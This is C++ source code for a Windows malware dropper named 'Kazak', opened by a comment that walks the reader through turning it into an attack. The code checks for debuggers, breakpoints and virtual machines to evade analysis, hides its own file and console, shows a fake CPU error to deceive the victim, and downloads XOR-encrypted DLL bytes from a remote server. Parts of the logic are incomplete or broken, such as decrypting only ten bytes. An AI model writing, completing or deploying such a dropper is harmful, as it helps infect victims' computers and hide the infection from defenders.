
/* How to create an attack using this dropper you may ask, well i gotchu

1. Get your DLL bytes using a Hex Editor and export them as C bytes
2. Encrypt your DLL bytes using the same algorithm used to decrypt them here and put them inside a text file on your server.
3. Put the link inside the source code.
4. That's it , enjoy.

*/

#include "../headers/Kazak.h"

#pragma comment(linker, "/arch:x86")

BOOL KazakDropper::IsBp(const char* lpszModule, const char* lpszFunction)
{
	HINSTANCE hLibrary;
	DWORD lpProc;

	hLibrary = li(GetModuleHandleA)(lpszModule);

	if (hLibrary == NULL)
	{
		hLibrary = li(LoadLibraryA)(lpszModule);
	}

	if (hLibrary != NULL)
	{
		lpProc = (DWORD)li(GetProcAddress)(hLibrary, lpszFunction);

		if (lpProc != 0)
		{
			if (*(BYTE*)lpProc == 0xCC) return TRUE;
		}

	}

	return FALSE;
}

bool KazakDropper::EvadeAnalysis()
{
	int iNumberOfThreads = std::thread::hardware_concurrency();

	if (KazakDropper::IsBp(enc("Kernel32.dll"), enc("GetModuleHandleA")) || KazakDropper::IsBp(enc("Kernel32.dll"), enc("LoadLibraryA")) || KazakDropper::IsBp(enc("Kernel32.dll"), enc("GetProcAddress")))
		return TRUE;

	else if (IsDebuggerPresent())
		return TRUE;

	else if (std::filesystem::exists(enc("C:\\Windows\\System32\\drivers\\vmxnet.sys")))
		return TRUE;

	else if (std::filesystem::exists(enc("C:\\Windows\\System32\\vboxdisp.dll")))
		return TRUE;

	else if (iNumberOfThreads == 4)
		return TRUE;

}

void KazakDropper::Stealth()
{
	li(SetFileAttributesA)(enc("Kazak.exe"), FILE_ATTRIBUTE_HIDDEN);
	li(ShowWindow)(GetConsoleWindow(), SW_HIDE);

	MessageBoxA(
		NULL,
		enc("This software is not able to execute on your current CPU architecture."),
		enc("Fatal Error - Invalid CPU"),
		MB_ICONERROR | MB_OKCANCEL); // fake error

	std::this_thread::sleep_for(std::chrono::seconds(5));
}

std::string KazakUtils::FileToString(std::wstring URL)
{
	const wchar_t* header = enc(L"Accept: *" "/" "*\r\n\r\n");
	HANDLE hInterWebz = InternetOpenA(enc("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HANDLE hURL = li(InternetOpenUrl)(hInterWebz, URL.c_str(), header, lstrlen(header), INTERNET_FLAG_DONT_CACHE, 0);

	char* Buffer = new char[100000000]; //100mb
	memset(Buffer, 0, 100000000);
	DWORD BytesRead = 1;

	std::string data;

	if (li(InternetReadFile)(hURL, Buffer, 100000000, &BytesRead))
	{
		data = std::string(Buffer);
	}

	delete[] Buffer;
	li(InternetCloseHandle)(hInterWebz);
	li(InternetCloseHandle)(hURL);

	return data;
}

void KazakDropper::PrepareExe()
{
	Storage S;
	S.BytesStorage = KazakUtils::FileToString(enc(L"link to the raw link where the bytes are stored"));
	S.Key = enc("KazakDropper");

	for (int x = 0; x < 10; x++)
		S.DecryptedBytes[x] = S.BytesStorage[x] ^ S.Key[x];
	
}

int main()
{
	while (!KazakDropper::EvadeAnalysis())
	{
		KazakDropper::Stealth();

		while (!li(InternetCheckConnectionA)(enc("https://google.com"), FLAG_ICC_FORCE_CONNECTION, 0))
			Sleep(1000);



	}

	if (KazakDropper::EvadeAnalysis())
		return 0;

	return 0;

}
